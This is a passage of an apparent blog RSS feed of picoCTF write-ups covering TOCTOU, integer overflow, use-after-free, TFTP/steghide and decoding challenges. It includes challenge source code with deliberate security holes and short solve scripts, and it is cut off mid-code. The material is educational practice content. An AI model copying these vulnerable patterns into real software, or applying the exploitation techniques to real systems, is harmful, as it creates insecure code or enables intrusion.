 55 : &amp;#34;9&amp;#34;,
 60 : &amp;#34;A&amp;#34;,
 65 : &amp;#34;B&amp;#34;,
 70 : &amp;#34;C&amp;#34;,
 75 : &amp;#34;D&amp;#34;,
 80 : &amp;#34;E&amp;#34;,
 85 : &amp;#34;F&amp;#34;,
}

message = &amp;#39;&amp;#39;
for i in trange(len(data)):
 message += decode_dic[data[i] // 100]

print(bytes.fromhex(message).decode())
&lt;/code>&lt;/pre>:::
Then you can get the source code and flag&amp;hellip;&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/tDPetapjm74">picoCTF 2021 Surfing the Waves&lt;/a>&lt;/p></description></item><item><title>PicoCTF - tic-tac</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---tic-tac/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---tic-tac/</guid><description>&lt;h1 id="picoctf---tic-tac">
 PicoCTF - tic-tac
 &lt;a class="anchor" href="#picoctf---tic-tac">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://myapollo.com.tw/blog/interview-question-race-condition/">後端工程師面試考什麼 - Race Condition 篇&lt;/a>
&lt;a href="https://ithelp.ithome.com.tw/articles/10208763"> [Day24]攻擊篇 &lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>TOCTTOU&lt;/p>
&lt;p>Time of check to time of use
在檢查和使用之間影響資源狀態的攻擊&lt;/p>
&lt;p>這種攻擊可能發生在共享資源中。
可能導致程式在資源處於意外狀態時執行無效操作。&lt;/p>&lt;/blockquote>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;iostream&amp;gt;
#include &amp;lt;fstream&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/stat.h&amp;gt;

int main(int argc, char *argv[]) {
 if (argc != 2) {
 std::cerr &amp;lt;&amp;lt; &amp;#34;Usage: &amp;#34; &amp;lt;&amp;lt; argv[0] &amp;lt;&amp;lt; &amp;#34; &amp;lt;filename&amp;gt;&amp;#34; &amp;lt;&amp;lt; std::endl;
 return 1;
 }

 std::string filename = argv[1];
 std::ifstream file(filename);
 struct stat statbuf;

 // Check the file&amp;#39;s status information.
 if (stat(filename.c_str(), &amp;amp;statbuf) == -1) {
 std::cerr &amp;lt;&amp;lt; &amp;#34;Error: Could not retrieve file information&amp;#34; &amp;lt;&amp;lt; std::endl;
 return 1;
 }

 // Check the file&amp;#39;s owner.
 if (statbuf.st_uid != getuid()) {
 std::cerr &amp;lt;&amp;lt; &amp;#34;Error: you don&amp;#39;t own this file&amp;#34; &amp;lt;&amp;lt; std::endl;
 return 1;
 }

 // Read the contents of the file.
 if (file.is_open()) {
 std::string line;
 while (getline(file, line)) {
 std::cout &amp;lt;&amp;lt; line &amp;lt;&amp;lt; std::endl;
 }
 } else {
 std::cerr &amp;lt;&amp;lt; &amp;#34;Error: Could not open file&amp;#34; &amp;lt;&amp;lt; std::endl;
 return 1;
 }

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Torrent Analyze</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---torrent-analyze/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---torrent-analyze/</guid><description>&lt;h1 id="picoctf---torrent-analyze">
 PicoCTF - Torrent Analyze
 &lt;a class="anchor" href="#picoctf---torrent-analyze">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.techworm.net/2017/03/seeds-peers-leechers-torrents-language.html">What are seeds, peers and leechers in Torrents’ language?&lt;/a>
&lt;a href="https://www.mobile01.com/topicdetail.php?f=507&amp;amp;t=1365797">慎選peer，是加速BT下載的王道！&lt;/a>&lt;/p>
&lt;blockquote>
&lt;ol>
&lt;li>seed個數：seed（即一般所說的「種子」）意指擁有完整檔案的BT參與者，是主要的檔案提供者。seed越多，可用的BT分享頻寬就越多，速度當然就快。&lt;/li>
&lt;li>seed與peer的比例：雖然peer（指尚未取得完整檔案的BT參與者）可同時自seed與其他peer下載檔案，但peer間會彼此競爭，以爭取有限的BT下載頻寬。因此，peer個數越多，分配後的BT分享頻寬就越少，速度自然就受影響。&lt;/li>
&lt;/ol>&lt;/blockquote>
&lt;p>&lt;a href="http://zfly9.blogspot.com/2014/10/hashmethod.html">教你該如何使用bt的info hash特徵碼，下載BT之torrent種子檔&lt;/a>&lt;/p>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>SOS, someone is torrenting on our network. One of your colleagues has been using torrent to download some files on the company’s network. Can you identify the file(s) that were downloaded? The file name will be the flag, like picoCTF{filename}.
Hint 1: Download and open the file with a packet analyzer like &lt;a href="https://www.wireshark.org/">Wireshark&lt;/a>.
Hint 2: You may want to enable BitTorrent protocol (BT-DHT, etc.) on Wireshark. Analyze -&amp;gt; Enabled Protocols
Hint 3: Try to understand peers, leechers and seeds. &lt;a href="https://www.techworm.net/2017/03/seeds-peers-leechers-torrents-language.html">Article&lt;/a>
Hint 4: The file name ends with &lt;code>.iso&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Transformation</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---transformation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---transformation/</guid><description>&lt;h1 id="picoctf---transformation">
 PicoCTF - Transformation
 &lt;a class="anchor" href="#picoctf---transformation">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-reverse">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Reverse&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-reverse">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/104?category=3&amp;amp;page=1">Transformation&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>enc file content: &lt;code>灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸彥㜰㍢㐸㙽&lt;/code>
Transformation Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">&amp;#39;&amp;#39;.join([chr((ord(flag[i]) &amp;lt;&amp;lt; 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)])
&lt;/code>&lt;/pre>&lt;p>Seems it shift the first character with 8 bits and concatenate the 2nd character then go through &lt;code>len(flag)&lt;/code>&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>My perspective is just recover the strings
:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">flag = &amp;#39;灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸彥㜰㍢㐸㙽&amp;#39;
enc = &amp;#39;&amp;#39;

def decimalToBinary(n):
 return bin(n).replace(&amp;#34;0b&amp;#34;, &amp;#34;&amp;#34;)

def binToHexa(n):
 bnum = int(n)
 temp = 0
 mul = 1
 count = 1
 hexaDeciNum = [&amp;#39;0&amp;#39;] * 100
 i = 0
 while bnum != 0:
 rem = bnum % 10
 temp = temp + (rem*mul)
 if count % 4 == 0:
 if temp &amp;lt; 10:
 hexaDeciNum[i] = chr(temp+48)
 else:
 hexaDeciNum[i] = chr(temp+55)
 mul = 1
 temp = 0
 count = 1
 i = i+1
 else:
 mul = mul*2
 count = count+1
 bnum = int(bnum/10)
 if count != 1:
 hexaDeciNum[i] = chr(temp+48)
 if count == 1:
 i = i-1
 hex_string = &amp;#39;&amp;#39;
 while i &amp;gt;= 0:
 hex_string += hexaDeciNum[i]
 i = i-1
 return hex_string


for i in range(0, len(flag)):
 plaintext1 = decimalToBinary(ord(flag[i]))
 while(len(plaintext1) != 16):
 plaintext1 = &amp;#39;0&amp;#39; + plaintext1
 plaintext2 = plaintext1[-8:]
 plaintext1 = plaintext1[0:8]
 enc += binToHexa(plaintext1)
 enc += binToHexa(plaintext2)
print(bytes.fromhex(enc).decode(&amp;#39;utf-8&amp;#39;))
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Trivial Flag Transfer Protocol</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---trivial-flag-transfer-protocol/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---trivial-flag-transfer-protocol/</guid><description>&lt;h1 id="picoctf---trivial-flag-transfer-protocol">
 PicoCTF - Trivial Flag Transfer Protocol
 &lt;a class="anchor" href="#picoctf---trivial-flag-transfer-protocol">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/103?bookmarked=0&amp;amp;category=4&amp;amp;page=1&amp;amp;search=&amp;amp;solved=0">Trivial Flag Transfer Protocol&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://tw511.com/a/01/2927.html">TFTP協定是什麼？&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://www.mobile01.com/topicdetail.php?f=110&amp;amp;t=921577">Wireless router中的UPnP是做什麼用的?&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>UPnP 是一種通訊協定，其主要功能是供家中的設備可以輕易的且自動的連結到網路並完成網路相關設定。
不需要您本人手動去設定就可以使用的意思。
所以你的 router 有支援並打開這項功能後，您家中的視訊設備（大部分都是支援UPnP）接上網路、打開電源。
接著你的 作業系統也支援的話，以winodws 為例，「我的電腦」中就會看到您新增的設備，如無線router、media server等等。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/questions/10002825">SSDP - 通訊協定 ?&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>SSDP的全寫是「Simple Service Discovery Protocol」，使用在Universal Plug and Play (UPnP)網絡環境中。SSDP使用UDP1900連接埠搜尋互聯網上的數據。當SSDP開啟時，其他設置會曝露自己到所有UPnP的用戶端中。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10278964">&lt;code>steghide&lt;/code> instruction&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="exploit---tftp--steghide">
 Exploit - TFTP + steghide
 &lt;a class="anchor" href="#exploit---tftp--steghide">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Save files
According to the article: &lt;a href="https://tw511.com/a/01/2927.html">TFTP協定是什麼？&lt;/a>, we can aware that this protocol is aim to transfer the data without authentication. So, we can download the files using wireshark.
&lt;img src="https://i.imgur.com/rETlGmm.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - two-sum</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---two-sum/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---two-sum/</guid><description>&lt;h1 id="picoctf---two-sum">
 PicoCTF - two-sum
 &lt;a class="anchor" href="#picoctf---two-sum">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>BoF&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

static int addIntOvf(int result, int a, int b) {
 result = a + b;
 if(a &amp;gt; 0 &amp;amp;&amp;amp; b &amp;gt; 0 &amp;amp;&amp;amp; result &amp;lt; 0)
 return -1;
 if(a &amp;lt; 0 &amp;amp;&amp;amp; b &amp;lt; 0 &amp;amp;&amp;amp; result &amp;gt; 0)
 return -1;
 return 0;
}

int main() {
 int num1, num2, sum;
 FILE *flag;
 char c;

 printf(&amp;#34;n1 &amp;gt; n1 + n2 OR n2 &amp;gt; n1 + n2 \n&amp;#34;);
 fflush(stdout);
 printf(&amp;#34;What two positive numbers can make this possible: \n&amp;#34;);
 fflush(stdout);
 
 if (scanf(&amp;#34;%d&amp;#34;, &amp;amp;num1) &amp;amp;&amp;amp; scanf(&amp;#34;%d&amp;#34;, &amp;amp;num2)) {
 printf(&amp;#34;You entered %d and %d\n&amp;#34;, num1, num2);
 fflush(stdout);
 sum = num1 + num2;
 if (addIntOvf(sum, num1, num2) == 0) {
 printf(&amp;#34;No overflow\n&amp;#34;);
 fflush(stdout);
 exit(0);
 } else if (addIntOvf(sum, num1, num2) == -1) {
 printf(&amp;#34;You have an integer overflow\n&amp;#34;);
 fflush(stdout);
 }

 if (num1 &amp;gt; 0 || num2 &amp;gt; 0) {
 flag = fopen(&amp;#34;flag.txt&amp;#34;,&amp;#34;r&amp;#34;);
 if(flag == NULL){
 printf(&amp;#34;flag not found: please run this on the server\n&amp;#34;);
 fflush(stdout);
 exit(0);
 }
 char buf[60];
 fgets(buf, 59, flag);
 printf(&amp;#34;YOUR FLAG IS: %s\n&amp;#34;, buf);
 fflush(stdout);
 exit(0);
 }
 }
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Unsubscriptions Are Free</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/</guid><description>&lt;h1 id="picoctf---unsubscriptions-are-free">
 PicoCTF - Unsubscriptions Are Free
 &lt;a class="anchor" href="#picoctf---unsubscriptions-are-free">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Heap Exploitation / Used After Free&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdint.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;ctype.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define FLAG_BUFFER 200
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define LINE_BUFFER_SIZE 20
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	uintptr_t (&lt;span style="color:#f92672">*&lt;/span>whatToDo)();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>username;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} cmd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> choice;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cmd &lt;span style="color:#f92672">*&lt;/span>user;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">hahaexploitgobrrr&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	&lt;span style="color:#66d9ef">char&lt;/span> buf[FLAG_BUFFER];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	FILE &lt;span style="color:#f92672">*&lt;/span>f &lt;span style="color:#f92672">=&lt;/span> fopen(&lt;span style="color:#e6db74">&amp;#34;flag.txt&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;r&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	fgets(buf,FLAG_BUFFER,f);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	fprintf(stdout,&lt;span style="color:#e6db74">&amp;#34;%s&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>,buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	fflush(stdout);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#a6e22e">getsline&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	getchar();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span> line &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">100&lt;/span>), &lt;span style="color:#f92672">*&lt;/span> linep &lt;span style="color:#f92672">=&lt;/span> line;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	size_t lenmax &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>, len &lt;span style="color:#f92672">=&lt;/span> lenmax;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> c;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span>(line &lt;span style="color:#f92672">==&lt;/span> NULL)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">return&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span>(;;) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		c &lt;span style="color:#f92672">=&lt;/span> fgetc(stdin);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span>(c &lt;span style="color:#f92672">==&lt;/span> EOF)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">--&lt;/span>len &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			len &lt;span style="color:#f92672">=&lt;/span> lenmax;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span> linen &lt;span style="color:#f92672">=&lt;/span> realloc(linep, lenmax &lt;span style="color:#f92672">*=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">if&lt;/span>(linen &lt;span style="color:#f92672">==&lt;/span> NULL) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>				free(linep);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>				&lt;span style="color:#66d9ef">return&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			line &lt;span style="color:#f92672">=&lt;/span> linen &lt;span style="color:#f92672">+&lt;/span> (line &lt;span style="color:#f92672">-&lt;/span> linep);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			linep &lt;span style="color:#f92672">=&lt;/span> linen;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span>((&lt;span style="color:#f92672">*&lt;/span>line&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> c) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\n&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f92672">*&lt;/span>line &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> linep;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">doProcess&lt;/span>(cmd&lt;span style="color:#f92672">*&lt;/span> obj) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	(&lt;span style="color:#f92672">*&lt;/span>obj&lt;span style="color:#f92672">-&amp;gt;&lt;/span>whatToDo)();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">s&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	printf(&lt;span style="color:#e6db74">&amp;#34;OOP! Memory leak...%p&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>,hahaexploitgobrrr);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;Thanks for subsribing! I really recommend becoming a premium member!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">p&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;Membership pending... (There&amp;#39;s also a super-subscription you can also get for twice the price!)&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">m&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;Account created.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">leaveMessage&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;I only read premium member messages but you can &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;try anyways:&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> msg &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)malloc(&lt;span style="color:#ae81ff">8&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, msg, &lt;span style="color:#ae81ff">8&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">i&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> response;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;You&amp;#39;re leaving already(Y/N)?&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	scanf(&lt;span style="color:#e6db74">&amp;#34; %c&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>response);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span>(toupper(response)&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Y&amp;#39;&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		puts(&lt;span style="color:#e6db74">&amp;#34;Bye!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		free(user);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		puts(&lt;span style="color:#e6db74">&amp;#34;Ok. Get premium membership please!&amp;#34;&lt;/span>);
